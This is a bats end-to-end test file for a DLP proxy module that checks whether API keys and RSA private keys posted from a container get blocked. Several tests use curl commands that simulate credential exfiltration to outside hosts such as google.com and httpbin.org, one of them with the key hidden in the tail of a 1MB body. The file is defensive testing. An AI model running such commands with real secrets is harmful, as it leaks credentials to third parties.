#!/usr/bin/env bats
# DLP Module E2E Tests
# Tests for credential detection and blocking via srv_molis_dlp
#
# NOTE: g3proxy uses HTTP/2 which causes curl exit code 92 (stream CANCEL)
# on many requests. Tests check output content, not exit codes.

setup() {
    TESTS_DIR="$(cd "${BATS_TEST_DIRNAME}/.." && pwd)"
    PROJECT_ROOT="$(cd "${TESTS_DIR}/.." && pwd)"
    load "${TESTS_DIR}/bats/bats-support/load.bash"
    load "${TESTS_DIR}/bats/bats-assert/load.bash"
    WORKSPACE_CONTAINER="polis-workspace"

    # Example credentials — use short keys that won't trigger aws_secret false positive
    ANTHROPIC_KEY="sk-ant-api01-abcdefghij1234567890"
    RSA_PRIVATE_KEY="-----BEGIN RSA PRIVATE KEY-----"
}

@test "e2e-dlp: Anthropic key to api.anthropic.com is ALLOWED" {
    # Credentials to allowed destination should pass through (not blocked by DLP)
    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "key=${ANTHROPIC_KEY}" \
        --connect-timeout 15 https://api.anthropic.com/v1/messages
    # Must NOT contain molis block headers
    refute_output --partial "x-molis-block"
}

@test "e2e-dlp: Anthropic key to google.com is BLOCKED" {
    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "exfiltrating_key=${ANTHROPIC_KEY}" \
        --connect-timeout 15 https://www.google.com
    assert_output --partial "x-molis-block: true"
    assert_output --partial "x-molis-reason: credential_detected"
    assert_output --partial "x-molis-pattern: anthropic"
}

@test "e2e-dlp: RSA private key to any destination is BLOCKED" {
    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "data=${RSA_PRIVATE_KEY}" \
        --connect-timeout 15 https://httpbin.org/post
    assert_output --partial "x-molis-block: true"
    assert_output --partial "x-molis-pattern: rsa_key"
}

@test "e2e-dlp: plain traffic without credentials is ALLOWED" {
    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST -d "hello=world" \
        --connect-timeout 15 https://httpbin.org/post
    refute_output --partial "x-molis-block"
}

@test "e2e-dlp: credential in tail of large body (>1MB) is BLOCKED" {
    docker exec "${WORKSPACE_CONTAINER}" sh -c \
        "dd if=/dev/zero bs=1M count=1 2>/dev/null > /tmp/large_payload && echo '${ANTHROPIC_KEY}' >> /tmp/large_payload"

    run docker exec "${WORKSPACE_CONTAINER}" curl -s -D - -o /dev/null \
        -X POST --data-binary @/tmp/large_payload \
        --connect-timeout 15 https://httpbin.org/post

    assert_output --partial "x-molis-block: true"

    # Cleanup
    docker exec "${WORKSPACE_CONTAINER}" rm -f /tmp/large_payload
}
